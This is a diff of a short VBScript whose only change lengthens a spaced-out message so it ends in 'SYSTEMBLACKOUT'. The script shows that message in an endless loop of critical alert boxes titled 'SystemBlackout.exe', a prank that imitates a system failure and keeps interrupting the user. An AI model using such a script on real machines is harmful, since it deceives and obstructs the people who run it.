@@ -1,6 +1,6 @@
 Do
     Dim message
-    message = "S                    B                    S                    B                                         Y                    L                    Y                    L                                         S                    A                    S                    A                    "
+    message = "S                    B                    S                    B                                         Y                    L                    Y                    L                                         S                    A                    S                    A                    S                    Y                    S                    T                    E                    M                    B                    L                    A                    C                    K                    O                    U                    T                    "
 
     MsgBox message, vbCritical, "SystemBlackout.exe"
 Loop
